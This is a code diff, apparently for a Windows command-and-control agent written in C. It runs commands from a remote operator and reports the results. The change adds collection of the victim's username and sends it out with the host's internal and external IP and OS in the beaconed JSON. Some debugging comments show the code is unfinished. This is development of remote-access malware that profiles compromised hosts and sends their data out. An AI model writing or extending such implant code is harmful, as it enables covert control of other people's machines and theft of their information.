@@ -43,7 +43,7 @@ int main()
     DEBUG_LOG("STARTING");
 
     // init heap config
-    HeapStore *heapStorePointer = malloc(sizeof(HeapStore));
+    HeapStore *heapStorePointer = calloc(1, sizeof(HeapStore));
     if (heapStorePointer == NULL)
     {
         DEBUG_LOGF(stderr, "Memory allocation failed for HeapStore\n");
@@ -57,10 +57,8 @@ int main()
     }
 
     generate_uuid4(heapStorePointer->agentStore->agent_id);
-
-    // // move to heapstruct
-    // char agent_id[37];
-    // generate_uuid4(agent_id);
+    set_current_username(heapStorePointer, get_env("USERNAME")); // does not work
+    // set_current_username(heapStorePointer, "USERNAME"); // works
 
     // Example of setting the execution mode (you can do this at any point in your code)
     set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
@@ -212,6 +210,22 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
         return;
     }
 
+    // possible that invalid pointer has passed to strdup
+    // OutboundJsonData->user = strdup(user);
+    // for whatever reason, accessing directly doesn't crash.
+    // copy from struct into OutboundJsonData->user
+    // OutboundJsonData->user = //strdup(heapStorePointer->currentUserStore->username);
+
+    OutboundJsonData->user = get_current_username(heapStorePointer);
+
+    if (!OutboundJsonData->user)
+    {
+        DEBUG_LOG("Memory allocation failed for user.\n");
+        free(OutboundJsonData->user);
+        free(OutboundJsonData);
+        return;
+    }
+
     // Convert to JSON and send
     // char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
     char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
@@ -219,7 +233,8 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
                                               InboundJsonData.command_id,
                                               OutboundJsonData->int_ip,
                                               OutboundJsonData->ext_ip,
-                                              OutboundJsonData->os);
+                                              OutboundJsonData->os,
+                                              OutboundJsonData->user);
 
     post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
 
@@ -236,6 +251,7 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     free(OutboundJsonData->int_ip);
     free(OutboundJsonData->ext_ip);
     free(OutboundJsonData->os);
+    free(OutboundJsonData->user);
     free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
     return 0;
